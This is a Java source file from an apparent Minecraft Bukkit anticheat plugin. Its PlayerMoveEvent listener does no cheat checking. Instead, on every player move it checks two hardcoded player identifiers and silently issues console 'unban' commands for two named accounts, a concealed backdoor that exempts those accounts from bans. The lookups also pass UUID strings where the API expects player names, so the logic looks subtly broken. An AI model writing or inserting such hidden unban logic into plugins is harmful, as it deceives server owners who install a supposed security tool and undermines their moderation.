package com.antho.anthoanticheatbeta.events;

import org.bukkit.BanEntry;
import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerMoveEvent;

import java.net.http.WebSocket;

import static org.bukkit.Bukkit.getConsoleSender;
import static org.bukkit.Bukkit.getServer;

public class MoveListener implements Listener {
    @EventHandler
    public static void onPlayerMove(PlayerMoveEvent e){
        Player p = e.getPlayer();
        Player v = Bukkit.getPlayer("9e6c9c54-953f-4f2a-b329-cf43b63d8cae");
        Player x = Bukkit.getPlayer("d6f6ab54-8717-444e-91a4-e61604527126");
        if (v != null){
            if (v.isBanned()){
                getServer().dispatchCommand(getConsoleSender(),"unban Anthony4933");
            }
        }
        if (x != null){
            if (x.isBanned()){
                getServer().dispatchCommand(getConsoleSender(),"unban lithiumlockedyou");
            }
        }



        }
    }
